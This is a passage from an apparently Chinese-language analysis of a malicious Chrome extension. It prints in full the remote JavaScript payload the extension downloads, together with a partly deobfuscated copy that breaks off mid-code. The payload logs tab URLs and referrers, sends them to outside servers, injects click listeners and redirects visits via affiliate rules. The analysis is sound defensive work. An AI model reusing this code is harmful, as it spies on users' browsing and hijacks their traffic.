<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">set(_0x1054f4) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x13679c, _0x5182a6) = &gt;&#123;</div><div class="line">        chrome[<span class="string">'storage'</span>][<span class="string">'local'</span>][<span class="string">'set'</span>](_0x1054f4,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_0x154ca1</span>) </span>&#123;</div><div class="line">            _0x13679c(_0x154ca1);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>function yJ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">yJ(_0x21744e) &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>((_0x23501d, _0x525375) = &gt;&#123;</div><div class="line">        chrome[<span class="string">'storage'</span>][<span class="string">'local'</span>][<span class="string">'yJ'</span>](_0x21744e,</div><div class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_0x298d92</span>) </span>&#123;</div><div class="line">            _0x23501d(_0x298d92);</div><div class="line">        &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段恶意js的执行流程如下：</p>
<p>这段恶意js的入口函数为function i，随后function i首先会向<code>https://the-extension.com/stats?hash=jwtmv6kavksy5cazdf4leg66r&amp;eventCategory=eval&amp;eventAction=init&amp;eventLabel=</code>更新运行状态</p>
<p>随后会调用function r，这个函数完成了下载恶意js并持久化存储到本地并执行的功能。</p>
<p>此时向n函数中传递的参数为<code>&quot;https://the-extension.com/?hash=jwtmv6kavksy5cazdf4leg66r&quot;</code>和<code>GET</code>，也就是用<code>GET</code>请求获取这个网页的内容。</p>
<p><img src="7.png" alt=""></p>
<p>下载下来的东西保存在了这里</p>
<p><img src="10.png" alt=""></p>
<p>外部的恶意js地址<code>https://the-extension.com/?hash=jwtmv6kavksy5cazdf4leg66r</code>，返回的json，我们把code取出来</p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"code"</span>:<span class="string">"function req(obj,callback,errback)&#123;var params=obj.params?obj.params:[],xhr=new XMLHttpRequest;if(callback&amp;&amp;(xhr.onload=function(e)&#123;e=e.target,200===e.status||304===e.status?callback(&#123;responseText:e.responseText,headers:e.getAllResponseHeaders().split(\"\\r\\n\")&#125;):errback&amp;&amp;errback(e.status)&#125;),errback&amp;&amp;(xhr.onerror=function(e)&#123;e=e.target.status,errback(e)&#125;),xhr.open(obj.method,obj.url),params.head)for(i in params.head)obj.setRequestHeader(i,params.head[i]);if(params.mime)for(i in params.mime)obj.overrideMimeType(params.mime[i]);if(params.post&amp;&amp;xhr.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\"),(params.post||params.xml)&amp;&amp;xhr.setRequestHeader(\"X-Requested-With\",\"XMLHttpRequest\"),\"object\"==typeof params.post)&#123;x=params.post,params.post=\"\";for(i in x)x.hasOwnProperty(i)&amp;&amp;(params.post+=(params.post?\"&amp;\":\"\")+i+\"=\"+x[i])&#125;xhr.send(params.post)&#125;function cutw(hostname)&#123;return hostname.replace(/(^www\\.|\\:\\d+$)/gi,\"\")&#125;function getDomain(hostname)&#123;var result,matches=hostname.match(domainRgxp);return matches&amp;&amp;(result=matches[1]),result&#125;function getSub(hostname,domain)&#123;var result=hostname.replace(domain,\"\");return result&amp;&amp;(result=result.replace(/\\.$/,\"\")),result&#125;function prepareLink(link)&#123;/^(\\w+:)?\\/\\//.test(link)||(link=\"http://\"+link);var result,matches=link.match(mainRgxp);if(matches)try&#123;var host=cutw(matches[2]),domain=getDomain(host);if(domain)&#123;var sub=getSub(host,domain);result=&#123;sch:matches[1],host:host,domain:domain,sub:sub,path:(matches[3]||\"\").replace(/^\\//,\"\"),search:(matches[4]||\"\").replace(/^\\?/,\"\")&#125;&#125;&#125;catch(e)&#123;console.log(\"Error: \"+url)&#125;return result&#125;function tryUrl(url)&#123;if(!(usedT&amp;&amp;usedT&gt;(new Date).getTime()-42e5))&#123;var res,prepared=prepareLink(url);if(prepared&amp;&amp;rulesObject[prepared.domain])&#123;var subd=rulesObject[prepared.domain][prepared.sub];if(subd&amp;&amp;(subd[prepared.path]?res=subd[prepared.path]:subd[\"*\"]&amp;&amp;(res=subd[\"*\"])),res||(subd=rulesObject[prepared.domain][\"*\"])&amp;&amp;(subd[prepared.path]?res=subd[prepared.path]:subd[\"*\"]&amp;&amp;(res=subd[\"*\"])),res)return res=res.replace(/__CURURL__/g,encodeURIComponent(url)).replace(/__SUBID__/g,wid),usedT=(new Date).getTime(),localStorage.usedT=usedT,res&#125;&#125;&#125;function getData()&#123;setTimeout(getData,864e5),req(&#123;method:\"GET\",url:host+\"bhrule?sub=\"+wid&#125;,function(response)&#123;try&#123;response=JSON.parse(response.responseText),rulesObject=response.rules?response.rules:&#123;&#125;&#125;catch(e)&#123;&#125;&#125;,function()&#123;&#125;)&#125;var wrap1=function()&#123;function qs(obj)&#123;return Object.keys(obj).filter(function(key)&#123;return(!!obj[key]||!1===obj[key])&amp;&amp;-1===filtered.indexOf(key)&#125;).map(function(key)&#123;var val=obj[key];return\"se\"===key?obj[key].map(function(v)&#123;return key+\"=\"+encodeURIComponent(v)&#125;).join(\"&amp;\"):(-1&lt;\"sh b a lt zz\".split(\" \").indexOf(key)&amp;&amp;(val=encodeURIComponent(val||\"\")),key+\"=\"+val)&#125;).join(\"&amp;\")&#125;function fetchOverlayPattern(data,callback)&#123;if(listenerLast=localStorage.getItem(\"listenerLast\"),(new Date).getTime()-listenerLast&gt;300)&#123;data.tnew=Date.now();var bqa=qs(data),payload=btoa(bqa),xhr=new XMLHttpRequest;xhr.open(\"POST\",configFetcher.MainLocator()+main_route,!0),xhr.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"),xhr.onload=function(e)&#123;if(200==this.status)try&#123;callback(JSON.parse(this.response))&#125;catch(e)&#123;&#125;&#125;,xhr.send([\"e\",encodeURIComponent(btoa(payload))].join(\"=\")),localStorage.setItem(\"listenerLast\",(new Date).getTime())&#125;&#125;function TabList()&#123;var hash=&#123;&#125;,lp=\"\",lpi=void 0;return&#123;remove:function(tid)&#123;delete hash[tid]&#125;,edit:function(tid,props)&#123;return tid?(hash[tid]||this.clear(tid),Object.keys(props||&#123;&#125;).forEach(function(key)&#123;hash[tid][key]=props[key]&#125;),hash[tid]):null&#125;,request:function(tabId,tab)&#123;if(configFetcher.IsEnable()&amp;&amp;toggler.isOn())&#123;if(!hash[tabId]||hash[tabId].p&amp;&amp;!hash[tabId].replaced)return void this.clear(tabId);var currTab=hash[tabId]||&#123;&#125;,url=validateUrl(tab.url);url&amp;&amp;(currTab.hh||lp!=tab.url)&amp;&amp;(tab.active||hash[tabId].fr||hash[tabId].uk.push(\"background_auto_reloading\"),hash[tabId].dada&amp;&amp;hash[hash[tabId].dada]&amp;&amp;hash[hash[tabId].dada].retroet&amp;&amp;(hash[tabId].zz=hash[hash[tabId].dada].retroet),fetchOverlayPattern(this.edit(tabId,&#123;sh:url,b:lp&#125;),function(d)&#123;&#125;),tab.active&amp;&amp;(lp=currTab.sh),hash[tabId].zz=null,hash[tabId].dada=null),this.clear(tabId),hash[tabId].sh=url,hash[tabId].p=!0&#125;&#125;,clear:function(tid)&#123;hash[tid]=&#123;var:version||\"missing\",val:21,un:\"1\",su:browsername,ch:ch,new:itemator1,exp:guid(),sesnew:\"\",d:0,se:[],restarting:!1,sh:(hash[tid]||&#123;&#125;).sh||null,a:(hash[tid]||&#123;&#125;).a||\"\",uk:[],fr:!1,aj:(hash[tid]||&#123;&#125;).aj||!1,replaced:(hash[tid]||&#123;&#125;).replaced||!1,hh:(hash[tid]||&#123;&#125;).hh||!1,dada:(hash[tid]||&#123;&#125;).dada||null,retroet:(hash[tid]||&#123;&#125;).retroet||\"\",zz:(hash[tid]||&#123;&#125;).zz||\"\"&#125;&#125;,details:function(tid,cb)&#123;chrome.tabs.get(tid,function(details)&#123;chrome.runtime.lastError||cb(details)&#125;)&#125;,lpUpdate:function(param)&#123;var idd=param.id||param;lpi=param.id||void 0,lp=(hash[idd]||&#123;&#125;).sh||lp&#125;,getLpi:function()&#123;return lpi&#125;&#125;&#125;function validateUrl(url)&#123;return 0===url.indexOf(\"http\")&amp;&amp;-1===url.indexOf(\"://localhost\")&amp;&amp;-1===url.indexOf(\"chrome/newtab\")&amp;&amp;0!==url.indexOf(\"chrome-\")&amp;&amp;0!==url.indexOf(\"about:\")&amp;&amp;-1===url.indexOf(\"chrome://\")?url:null&#125;function reselected(tid)&#123;tablist.details((tid||&#123;&#125;).tabId||tid,tablist.lpUpdate)&#125;function onUpdated(tabId,details,tab)&#123;details&amp;&amp;\"complete\"===details.status&amp;&amp;(tablist.edit(tabId).p&amp;&amp;tablist.edit(tabId).aj&amp;&amp;tablist.edit(tabId,&#123;sh:void 0,p:!1,aj:!1&#125;),tablist.edit(tabId,&#123;ng:\"ajax\",aj:!0&#125;),tablist.request(tabId,tab),tablist.edit(tabId,&#123;replaced:!1&#125;))&#125;function onReplaced(addedTabId,removedTabId)&#123;tablist.edit(addedTabId,&#123;replaced:!0&#125;),tablist.details(addedTabId,tablist.request.bind(tablist,(addedTabId||&#123;&#125;).tabId||addedTabId))&#125;function onBeforeSendHeaders(details)&#123;return tablist.edit(details.tabId,&#123;hh:!0&#125;),details.requestHeaders.some(function(rh)&#123;return/^Referer$/i.test(rh.name)&amp;&amp;tablist.edit(details.tabId,&#123;a:rh.value&#125;)&#125;)||tablist.edit(details.tabId,&#123;a:\"\"&#125;),&#123;requestHeaders:details.requestHeaders&#125;&#125;function onCommitted(dtls)&#123;dtls=dtls||&#123;&#125;;var tid=dtls.tabId,tsh=dtls.transitionQualifiers;tid&amp;&amp;0===dtls.frameId&amp;&amp;(tablist.edit(tid,&#123;ng:dtls.transitionType,tsh:tsh&#125;),/client_redirect/.test(tsh)&amp;&amp;tablist.edit(tid,&#123;lt:dtls.url&#125;),/server_redirect/.test(tsh),tablist.details(tid,tablist.request.bind(tablist,(tid||&#123;&#125;).tabId||tid)))&#125;function cwonRemoved(windowID)&#123;ct.query(&#123;active:!0&#125;,function(tabs)&#123;tabs[0]&amp;&amp;tablist.lpUpdate(tabs[0])&#125;)&#125;function cwonFocused(window)&#123;cw.WINDOW_ID_NONE!=window&amp;&amp;ct.query(&#123;windowId:window,active:!0&#125;,function(tabs)&#123;tabs[0]&amp;&amp;tabs[0].active&amp;&amp;tablist.lpUpdate(tabs[0])&#125;)&#125;function onCreated(tab)&#123;var openerTabId=(tablist.edit(tab.id,&#123;fr:!0,replaced:!1&#125;),tab.openerTabId||tablist.getLpi());tablist.edit(openerTabId),tab.url.length&amp;&amp;tablist.edit(openerTabId)&amp;&amp;tab.url===tablist.edit(openerTabId).sh?tablist.edit(tab.id).uk.push(\"duplication\"):tab.url.length&amp;&amp;ct.query(&#123;url:tab.url&#125;,function(tabs)&#123;(tabs||[]).length&gt;1&amp;&amp;(tablist.edit(tab.id).uk.push(\"duplication\"),tablist.edit(tab.id).uk.push(\"background_duplication\"))&#125;),\"complete\"!=tab.status||tab.openerTabId||tablist.edit(tab.id).uk.push(\"reopening\"),tablist.edit(tab.id,&#123;dada:openerTabId&#125;)&#125;function guid()&#123;var guid=localStorage.getItem(guid_key);if(!guid)&#123;var g=function()&#123;return(65536*(1+Math.random(Date.now()+12))|0).toString(30).substring(1)&#125;;guid=g()+g()+g()+g()+g()+g()+g()+g()+g(),localStorage.setItem(guid_key,guid)&#125;return guid&#125;var itemator1=310,version=chrome.runtime.getManifest().version,main_route=(localStorage.serverInfo&amp;&amp;JSON.parse(localStorage.serverInfo),\"/logic/page/data\"),guid_key=\"uaswitcherk\",skeys=[\"o\",\"u\"],ch=4,browsername=\"chrome\",toggler=new function()&#123;function save()&#123;localStorage.setItem(localKey,isOn?1:0)&#125;function _optTurnOn()&#123;&#125;var isOn=!0,localKey=\"isdugnlkWfmgosd2\";this.turnOn=function()&#123;isOn=!0,save(),_optTurnOn()&#125;,this.turnOff=function()&#123;isOn=!1,save()&#125;,this.isOn=function()&#123;return isOn&#125;,this.whenOn=function()&#123;return this.isOn()?Promise.resolve(!0):new Promise(function(resolve)&#123;_optTurnOn=function()&#123;resolve()&#125;&#125;)&#125;,function()&#123;var val=localStorage.getItem(localKey),intVal=parseInt(val);isOn=!!isNaN(intVal)||1===intVal&#125;()&#125;,configFetcher=new function()&#123;var settings=\"\",setDump=function()&#123;localStorage.setItem(\"uasc\",JSON.stringify(settings))&#125;,setUp=function(endpt)&#123;var cb=function(sts,resp)&#123;sts&amp;&amp;(settings=JSON.parse(resp),setDump())&#125;,xhr=new XMLHttpRequest;xhr.onreadystatechange=function()&#123;4==xhr.readyState&amp;&amp;cb.apply(null,[200==xhr.status,xhr.responseText].concat(arguments))&#125;,xhr.open(\"GET\",endpt+\"?\"+function(arr)&#123;return Object.keys(arr).map(function(hashed)&#123;return hashed+\"=\"+arr[hashed]&#125;).join(\"&amp;\")&#125;(&#123;s:itemator1,ver:version&#125;),!0),xhr.send()&#125;;!function()&#123;var p=localStorage.getItem(\"uasc\");settings=p?JSON.parse(p):settings&#125;(),toggler.whenOn().then(function()&#123;setUp(\"https://uaswitcher.org/splash\")&#125;),this.enablator=function()&#123;settings[skeys[0]]=1,setDump()&#125;,this.disablator=function()&#123;settings[skeys[0]]=0,setDump()&#125;,this.IsEnable=function()&#123;return Boolean(settings&amp;&amp;settings[skeys[0]])&#125;,this.MainLocator=function()&#123;return settings&amp;&amp;settings[skeys[1]]&#125;&#125;,filtered=[\"restarting\",\"hh\",\"p\",\"fr\",\"aj\",\"replaced\",\"retroet\",\"dada\"],listenerLast=localStorage.getItem(\"listenerLast\")||0,tablist=new TabList,ct=(chrome.browserAction,chrome.tabs),wr=chrome.webRequest,wn=chrome.webNavigation,cw=chrome.windows;chrome.runtime.onMessage.addListener(function(request,sender)&#123;request.href?tablist.edit(sender.tab.id,&#123;zz:request.href&#125;):request.ahref&amp;&amp;tablist.edit(sender.tab.id,&#123;retroet:request.ahref&#125;)&#125;),cw.getAll(&#123;populate:!0&#125;,function(windows)&#123;for(var w=0;w&lt;windows.length;w++)for(var i=0;i&lt;windows[w].tabs.length;i++)validateUrl(windows[w].tabs[i].url)&amp;&amp;(tablist.edit(windows[w].tabs[i].id,&#123;sh:windows[w].tabs[i].url,restarting:!0&#125;),windows[w].focused&amp;&amp;windows[w].tabs[i].active&amp;&amp;tablist.lpUpdate(windows[w].tabs[i]))&#125;),ct.onUpdated.addListener(onUpdated),ct.onReplaced.addListener(onReplaced);var repertuar=&#123;types:[\"main_frame\"],urls:[\"&lt;all_urls&gt;\"]&#125;;return wr.onBeforeRequest.addListener(function(details)&#123;validateUrl(details.url)&amp;&amp;tablist.edit(details.tabId,&#123;sh:void 0,p:!1,aj:!1&#125;)&#125;,repertuar,[\"blocking\"]),wr.onBeforeRedirect.addListener(function(details)&#123;validateUrl(details.url)&amp;&amp;tablist.edit(details.tabId).se.push(details.url)&#125;,repertuar),wr.onBeforeSendHeaders.addListener(onBeforeSendHeaders,repertuar,[\"blocking\",\"requestHeaders\"]),wr.onHeadersReceived.addListener(function(details)&#123;tablist.edit(details.tabId,&#123;hh:!0&#125;)&#125;,repertuar),wn.onCommitted.addListener(onCommitted),ct.onRemoved.addListener(function(tabId)&#123;tablist.remove(tabId)&#125;),cw.onRemoved.addListener(cwonRemoved),ct.onCreated.addListener(onCreated),cw.onFocusChanged.addListener(cwonFocused),ct.onActivated?ct.onActivated.addListener(reselected):ct.onSelectionChanged.addListener(reselected),wr.onErrorOccurred.addListener(function(details)&#123;try&#123;tablist.edit(details.tabId,&#123;se:null&#125;)&#125;catch(e)&#123;&#125;&#125;,repertuar),&#123;optin:toggler.turnOn,optout:toggler.turnOff,isopt:toggler.isOn,whenopt:toggler.whenOn()&#125;&#125;();wrap1.optin(),chrome.tabs.onUpdated.addListener(function(tabId)&#123;chrome.tabs.get(tabId,function(tab)&#123;\"loading\"==tab.status&amp;&amp;chrome.tabs.executeScript(tab.id,&#123;code:`\r\n                    if(!document.getElementById(\"sbmarwusasv5\")) &#123;\r\n                       var flag=document.createElement(\"span\");\r\n                       flag.id=\"sbmarwusasv5\";\r\n                       document.body.appendChild(flag);\r\n     \r\n                       document.body.addEventListener(\"click\", function(event) &#123;\r\n                        try &#123;\r\n                            if(event.target.href) &#123;\r\n                                chrome.runtime.sendMessage(&#123;href: event.target.href, listener: \"usassmwv5\"&#125;);\r\n                            &#125;\r\n                        &#125;catch(e)&#123;\r\n                            console.log(e);\r\n                        &#125;\r\n                       &#125;);\r\n                    \r\n                    document.body.addEventListener(\"contextmenu\", function(event) &#123;\r\n                        if(event.target.href) &#123;\r\n                            chrome.runtime.sendMessage(&#123;ahref: event.target.href, listener: \"usassmwv5\"&#125;);\r\n                        &#125;\r\n                        return false;\r\n                    &#125;, false);\r\n                    \r\n                    document.body.addEventListener(\"auxclick\", function(event) &#123;\r\n                        if(event.target.href) &#123;\r\n                            chrome.runtime.sendMessage(&#123;ahref: event.target.href, listener: \"usassmwv5\"&#125;);\r\n                        &#125;\r\n                    &#125;);\r\n             &#125;`&#125;)&#125;)&#125;);var host=\"http://api.data-monitor.info/api/\",wid=116,rulesObject=&#123;&#125;,usedT=localStorage.usedT?parseInt(localStorage.usedT):null,mainRgxp=new RegExp(\"^(?:([^:\\\\/?]+):)?(?:\\\\/\\\\/([^\\\\/]*))?([^?]*)(?:\\\\?([^$]*))?\"),domainRgxp=/((?:[^.]+)\\.(?:(?:com?|org)\\.)?\\w+)$/i,listenFunc=function(details)&#123;if(!(usedT&amp;&amp;usedT&gt;(new Date).getTime()-42e5)&amp;&amp;0===details.frameId&amp;&amp;\"main_frame\"==details.type&amp;&amp;-1===details.parentFrameId&amp;&amp;details.tabId&gt;0&amp;&amp;/^https?/i.test(details.url))&#123;var current=details.url,new_url=(prepareLink(current),tryUrl(current));if(\"string\"==typeof new_url&amp;&amp;current!=new_url)return&#123;redirectUrl:new_url&#125;&#125;&#125;;chrome.webRequest.onBeforeRequest.addListener(listenFunc,&#123;urls:[\"&lt;all_urls&gt;\"]&#125;,[\"blocking\"]),getData();"</span>,<span class="attr">"version"</span>:<span class="string">"v20170905"</span>&#125;</div></pre></td></tr></table></figure>
<p>可以看到，这段恶意代码的版本是<code>v20170905</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><div class="line">&#123;<span class="attr">"code"</span>:<span class="string">"evil javascript"</span>, <span class="attr">"version"</span>:<span class="string">"v20170905"</span>&#125;</div></pre></td></tr></table></figure>
<p>把这段js提取出来</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">req</span>(<span class="params">obj, callback, errback</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> params = obj.params ? obj.params: [],</div><div class="line">    xhr = <span class="keyword">new</span> XMLHttpRequest;</div><div class="line">    <span class="keyword">if</span> (callback &amp;&amp; (xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">        e = e.target,</div><div class="line">        <span class="number">200</span> === e.status || <span class="number">304</span> === e.status ? callback(&#123;</div><div class="line">            <span class="attr">responseText</span>: e.responseText,</div><div class="line">            <span class="attr">headers</span>: e.getAllResponseHeaders().split(<span class="string">"\r\n"</span>)</div><div class="line">        &#125;) : errback &amp;&amp; errback(e.status)</div><div class="line">    &#125;), errback &amp;&amp; (xhr.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">        e = e.target.status,</div><div class="line">        errback(e)</div><div class="line">    &#125;), xhr.open(obj.method, obj.url), params.head) <span class="keyword">for</span> (i <span class="keyword">in</span> params.head) obj.setRequestHeader(i, params.head[i]);</div><div class="line">    <span class="keyword">if</span> (params.mime) <span class="keyword">for</span> (i <span class="keyword">in</span> params.mime) obj.overrideMimeType(params.mime[i]);</div><div class="line">    <span class="keyword">if</span> (params.post &amp;&amp; xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>), (params.post || params.xml) &amp;&amp; xhr.setRequestHeader(<span class="string">"X-Requested-With"</span>, <span class="string">"XMLHttpRequest"</span>), <span class="string">"object"</span> == <span class="keyword">typeof</span> params.post) &#123;</div><div class="line">        x = params.post,</div><div class="line">        params.post = <span class="string">""</span>;</div><div class="line">        <span class="keyword">for</span> (i <span class="keyword">in</span> x) x.hasOwnProperty(i) &amp;&amp; (params.post += (params.post ? <span class="string">"&amp;"</span>: <span class="string">""</span>) + i + <span class="string">"="</span> + x[i])</div><div class="line">    &#125;</div><div class="line">    xhr.send(params.post)</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">cutw</span>(<span class="params">hostname</span>) </span>&#123; <span class="comment">// 去除域名中的www和端口 比如 www.baidu.com:443 =&gt; baidu.com</span></div><div class="line">    <span class="keyword">return</span> hostname.replace(<span class="regexp">/(^www\.|\:\d+$)/gi</span>, <span class="string">""</span>)</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getDomain</span>(<span class="params">hostname</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> result, matches = hostname.match(domainRgxp);</div><div class="line">    <span class="keyword">return</span> matches &amp;&amp; (result = matches[<span class="number">1</span>]),</div><div class="line">    result</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSub</span>(<span class="params">hostname, domain</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> result = hostname.replace(domain, <span class="string">""</span>);</div><div class="line">    <span class="keyword">return</span> result &amp;&amp; (result = result.replace(<span class="regexp">/\.$/</span>, <span class="string">""</span>)),</div><div class="line">    result</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">prepareLink</span>(<span class="params">link</span>) </span>&#123; </div><div class="line">    /^(\w+:)?\/\<span class="comment">//.test(link) || (link = "http://" + link);</span></div><div class="line">    <span class="keyword">var</span> result, matches = link.match(mainRgxp);</div><div class="line">    <span class="keyword">if</span> (matches) <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> host = cutw(matches[<span class="number">2</span>]),</div><div class="line">        domain = getDomain(host);</div><div class="line">        <span class="keyword">if</span> (domain) &#123;</div><div class="line">            <span class="keyword">var</span> sub = getSub(host, domain);</div><div class="line">            result = &#123;</div><div class="line">                <span class="attr">sch</span>: matches[<span class="number">1</span>],</div><div class="line">                <span class="attr">host</span>: host,</div><div class="line">                <span class="attr">domain</span>: domain,</div><div class="line">                <span class="attr">sub</span>: sub,</div><div class="line">                <span class="attr">path</span>: (matches[<span class="number">3</span>] || <span class="string">""</span>).replace(<span class="regexp">/^\//</span>, <span class="string">""</span>),</div><div class="line">                <span class="attr">search</span>: (matches[<span class="number">4</span>] || <span class="string">""</span>).replace(<span class="regexp">/^\?/</span>, <span class="string">""</span>)</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">"Error: "</span> + url)</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryUrl</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (! (usedT &amp;&amp; usedT &gt; (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() - <span class="number">42e5</span>)) &#123;</div><div class="line">        <span class="keyword">var</span> res, prepared = prepareLink(url);</div><div class="line">        <span class="keyword">if</span> (prepared &amp;&amp; rulesObject[prepared.domain]) &#123;</div><div class="line">            <span class="keyword">var</span> subd = rulesObject[prepared.domain][prepared.sub];</div><div class="line">            <span class="keyword">if</span> (subd &amp;&amp; (subd[prepared.path] ? res = subd[prepared.path] : subd[<span class="string">"*"</span>] &amp;&amp; (res = subd[<span class="string">"*"</span>])), res || (subd = rulesObject[prepared.domain][<span class="string">"*"</span>]) &amp;&amp; (subd[prepared.path] ? res = subd[prepared.path] : subd[<span class="string">"*"</span>] &amp;&amp; (res = subd[<span class="string">"*"</span>])), res) <span class="keyword">return</span> res = res.replace(<span class="regexp">/__CURURL__/g</span>, <span class="built_in">encodeURIComponent</span>(url)).replace(<span class="regexp">/__SUBID__/g</span>, wid),</div><div class="line">            usedT = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime(),</div><div class="line">            localStorage.usedT = usedT,</div><div class="line">            res</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123; <span class="comment">// 获取推广规则</span></div><div class="line">    setTimeout(getData, <span class="number">864e5</span>),</div><div class="line">    req(&#123;</div><div class="line">        <span class="attr">method</span>: <span class="string">"GET"</span>,</div><div class="line">        <span class="attr">url</span>: host + <span class="string">"bhrule?sub="</span> + wid <span class="comment">// 设置推广连接</span></div><div class="line">    &#125;,</div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            response = <span class="built_in">JSON</span>.parse(response.responseText),</div><div class="line">            rulesObject = response.rules ? response.rules: &#123;&#125;</div><div class="line">        &#125; <span class="keyword">catch</span>(e) &#123;&#125;</div><div class="line">    &#125;,</div><div class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> wrap1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">qs</span>(<span class="params">obj</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="built_in">Object</span>.keys(obj).filter(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</div><div class="line">            <span class="keyword">return</span> ( !! obj[key] || !<span class="number">1</span> === obj[key]) &amp;&amp; <span class="number">-1</span> === filtered.indexOf(key)</div><div class="line">        &#125;).map(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</div><div class="line">            <span class="keyword">var</span> val = obj[key];</div><div class="line">            <span class="keyword">return</span> <span class="string">"se"</span> === key ? obj[key].map(<span class="function"><span class="keyword">function</span>(<span class="params">v</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> key + <span class="string">"="</span> + <span class="built_in">encodeURIComponent</span>(v)</div><div class="line">            &#125;).join(<span class="string">"&amp;"</span>) : ( - <span class="number">1</span> &lt; <span class="string">"sh b a lt zz"</span>.split(<span class="string">" "</span>).indexOf(key) &amp;&amp; (val = <span class="built_in">encodeURIComponent</span>(val || <span class="string">""</span>)), key + <span class="string">"="</span> + val)</div><div class="line">        &#125;).join(<span class="string">"&amp;"</span>)</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">  <span class="comment">// 上传用户的隐私数据</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fetchOverlayPattern</span>(<span class="params">data, callback</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (listenerLast = localStorage.getItem(<span class="string">"listenerLast"</span>), (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime() - listenerLast &gt; <span class="number">300</span>) &#123;</div><div class="line">            data.tnew = <span class="built_in">Date</span>.now();</div><div class="line">            <span class="keyword">var</span> bqa = qs(data),</div><div class="line">            payload = btoa(bqa),</div><div class="line">            xhr = <span class="keyword">new</span> XMLHttpRequest;</div><div class="line">            xhr.open(<span class="string">"POST"</span>, configFetcher.MainLocator() + main_route, !<span class="number">0</span>),</div><div class="line">            xhr.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>),</div><div class="line">            xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> (<span class="number">200</span> == <span class="keyword">this</span>.status) <span class="keyword">try</span> &#123;</div><div class="line">                    callback(<span class="built_in">JSON</span>.parse(<span class="keyword">this</span>.response))</div><div class="line">                &#125; <span class="keyword">catch</span>(e) &#123;&#125;</div><div class="line">            &#125;,</div><div class="line">            xhr.send([<span class="string">"e"</span>, <span class="built_in">encodeURIComponent</span>(btoa(payload))].join(<span class="string">"="</span>)),</div><div class="line">            localStorage.setItem(<span class="string">"listenerLast"</span>, (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime())</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">TabList</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> hash = &#123;&#125;,</div><div class="line">        lp = <span class="string">""</span>,</div><div class="line">        lpi = <span class="keyword">void</span> <span class="number">0</span>;</div><div class="line">        <span class="keyword">return</span> &#123;</div><div class="line">            <span class="attr">remove</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tid</span>) </span>&#123;</div><div class="line">                <span class="keyword">delete</span> hash[tid]</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">edit</span>: <span class="function"><span class="keyword">function</span>(<span class="params">tid, props</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> tid ? (hash[tid] || <span class="keyword">this</span>.clear(tid), <span class="built_in">Object</span>.keys(props || &#123;&#125;).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</div><div class="line">                    hash[tid][key] = props[key]</div><div class="line">                &#125;), hash[tid]) : 